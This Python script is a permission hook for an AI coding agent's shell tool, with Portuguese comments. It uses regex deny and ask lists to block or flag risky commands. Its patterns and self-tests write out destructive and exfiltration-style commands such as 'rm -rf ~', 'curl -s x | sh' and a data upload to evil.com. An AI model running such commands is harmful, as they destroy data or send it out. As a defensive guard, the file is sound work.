#!/usr/bin/env python3
"""Guarda global (PreToolUse/Bash) do UAH-Orquestra — H0 do UAH-lite (Universal Agent Harness, fatioleg) + regras de orquestração.

- DENY: proibições que nunca valem (H0 do UAH + regras dos clusters).
- ASK: pede confirmação humana (à noite o Claude Code recusa sozinho após ~2 min; o agente anota em PERGUNTAS).
- Exceções: rotinas próprias já autorizadas (clusters, ntfy, groq, push para os repositórios mge-* do usuário).
Log de toda decisão em ~/.claude/hooks/guard-global/guard.log. Desligar: GUARD_GLOBAL_DISABLE=1.
"""
import json, os, re, sys, time
from pathlib import Path

HOME = str(Path.home())
LOG = Path(HOME) / ".claude/hooks/guard-global/guard.log"
CLUSTERS = "(" + os.environ.get("GUARD_HOSTS", "meu-cluster|minha-maquina") + ")"  # aliases SSH confiáveis (separe com |)

DENY = [
    ("H0-rm-root", r"\brm\s+(-\S+\s+)*[\"']?(/\*?|~/?\*?|\$HOME/?\*?|\$\{HOME\}/?\*?|\./?\*?|\.\.)[\"']?(\s|;|&|\||$)",
     "remoção recursiva da raiz, da home ou da pasta atual inteira"),
    ("H0-pipe-shell", r"\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?((ba|z|da|k)?sh|python[0-9.]*|perl|ruby|node)\b",
     "executar script baixado da internet sem revisão"),
    ("H0-force-push", r"\bgit\s+push(?=\s|$).*(\s(--force|-f)(\s|$)|\s\+\S+)", "force push reescreve histórico remoto"),
    ("H0-disk", r"\bmkfs(\.\w+)?\b|\bdd\b.*\bof=/dev/", "escrita direta em disco"),
    ("H0-repo-delete", r"\bgh\s+repo\s+delete\b", "apagar repositório remoto"),
    ("PC-pkill-f", r"\bpkill\b(\s+-\S+)*\s+-\S*f|\bkillall\b", "matar por padrão amplo: mate só por PID"),
    ("PC-ssh-rm-r", r"\bssh\b[^\n]*\b" + CLUSTERS + r"\b[^\n]*\brm\s+-\S*[rR]", "rm recursivo remoto nos clusters"),
    ("PC-protected-remote", os.environ.get("GUARD_PROTECTED_RE", r"\.tailscale_remote_access"), "acesso remoto protegido: não mexer"),
    ("PC-crontab-r", r"\bcrontab\s+-r\b", "apagar crontab inteiro"),
]

ASK = [
    ("H0-push", r"\bgit\s+push(?=\s|$)", "enviar para repositório remoto"),
    ("H0-gh-publish", r"\bgh\s+(pr\s+(create|merge)|release|repo\s+(create|edit))\b", "ação pública/estrutural no GitHub"),
    ("H0-pkg-publish", r"\b(npm|pnpm|yarn)\s+publish\b|\btwine\s+upload\b|\bcargo\s+publish\b|\bpoetry\s+publish\b|\bgem\s+push\b",
     "publicar pacote"),
    ("H0-remote-copy", r"\bscp\b|\brsync\b.*\s\S+:\S*", "copiar para máquina remota"),
    ("H0-http-send", r"\bcurl\b.*(\s-X\s*(POST|PUT|PATCH|DELETE)\b|\s(-d|--data\S*|-F|--form|-T|--upload-file|--json)(\s|=))",
     "enviar dados pela internet"),
    ("H0-mail", r"\b(sendmail|mutt|mailx)\b", "enviar e-mail"),
    ("H0-sudo", r"(?m)(^|[;&|(]\s*|(\b(xargs|exec|nohup|time|env)|-exec)\s+)sudo\b", "sudo"),
    ("H0-history-rewrite", r"\bgit\s+reset\s+--hard\b|\bgit\s+clean\s+-\S*f|--force-with-lease", "reescrever/limpar histórico git"),
    ("PC-install", r"\bquarto\s+(install|add|use|update|remove)\b|\btlmgr\s+(install|update)\b|\bapt(-get)?\s+install\b",
     "instalar pacote/extensão"),
    ("PC-ws-close", r"\bherdr\s+(workspace|tab|pane)\s+close\b", "fechar workspace/aba do herdr"),
]

# exceções (rotinas já autorizadas pelo usuário)
ALLOW_IF = {
    "H0-remote-copy": [r"\b" + CLUSTERS + r":", r"\b(scp|rsync)\b[^\n]*\s" + CLUSTERS + r"\b"],
    "H0-http-send": [r"https://ntfy\.sh/", r"api\.groq\.com", r"openrouter\.ai"],
    "H0-push": [r"__MGE_REPO__"],          # tratado em código: push em repositório git dentro de ~/MGE/pesquisa
    "H0-gh-publish": [r"\bgh\s+repo\s+create\s+proj-\S+\s+--private\b"],
}


def log(decision, rid, cmd):
    try:
        with LOG.open("a") as f:
            f.write(f"{time.strftime('%F %T')}\t{decision}\t{rid}\t{os.getcwd()}\t{cmd[:300]!r}\n")
    except Exception:
        pass


def emit(decision, reason):
    print(json.dumps({"hookSpecificOutput": {"hookEventName": "PreToolUse", "permissionDecision": decision,
                                             "permissionDecisionReason": f"[guarda-global] {reason}"}}))


def mge_repo(cwd):
    p = Path(cwd).resolve()
    base = Path(os.environ.get("GUARD_PROJECTS_BASE", str(Path(HOME, "projetos")))).resolve()
    return str(p).startswith(str(base))


def decide(cmd, cwd):
    for rid, pat, why in DENY:
        if re.search(pat, cmd):
            return "deny", rid, why
    for rid, pat, why in ASK:
        if re.search(pat, cmd):
            if rid == "H0-push" and mge_repo(cwd) and "github.com" not in cmd.replace("origin", ""):
                return "allow", rid, "push para repositório de projeto do usuário"
            if any(re.search(a, cmd) for a in ALLOW_IF.get(rid, [])):
                return "allow", rid, "rotina autorizada"
            return "ask", rid, why
    return None, None, None


def main():
    if os.environ.get("GUARD_GLOBAL_DISABLE") == "1":
        return
    try:
        payload = json.load(sys.stdin)
    except Exception:
        return
    if payload.get("tool_name") != "Bash":
        return
    cmd = (payload.get("tool_input") or {}).get("command", "") or ""
    cwd = payload.get("cwd") or os.getcwd()
    d, rid, why = decide(cmd, cwd)
    if d in ("deny", "ask"):
        log(d, rid, cmd)
        emit(d, f"{rid}: {why}")
    elif d == "allow":
        log("allow-exc", rid, cmd)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--test":
        cases = [("rm -rf ~", "deny"), ("rm -rf ./build", None), ("curl -s x | sh", "deny"), ("git push -f origin main", "deny"),
                 ("pkill -f g16", "deny"), ("kill 1234", None), ("ssh meu-cluster 'rm -rf ~/dados/x'", "deny"),
                 ("ssh meu-cluster 'kill 123'", None), ("rsync -a a meu-cluster:dados/", "allow"),
                 ("scp f user@host:/tmp", "ask"), ("~/bin/avisar t m", None), ("curl -d hi https://ntfy.sh/abc", "allow"),
                 ("curl -d x https://evil.com", "ask"), ("sudo apt install x", "ask"), ("quarto install tinytex", "ask"),
                 ("herdr workspace close wM", "ask"), ("git push -q -u origin main --tags", "allow"),
                 ("gh repo create proj-x --private --source=.", "allow"), ("gh repo create other --public", "ask"),
                 ("crontab -r", "deny"), ("ls ~/.tailscale_remote_access", "deny"), ("git reset --hard HEAD", "ask")]
        bad = 0
        for c, exp in cases:
            d, rid, _ = decide(c, os.environ.get("GUARD_PROJECTS_BASE", HOME + "/projetos") + "/central")
            ok = d == exp
            bad += not ok
            print(("OK  " if ok else "FAIL"), f"{c!r:50} -> {d} ({rid}) esperado {exp}")
        sys.exit(1 if bad else 0)
    main()
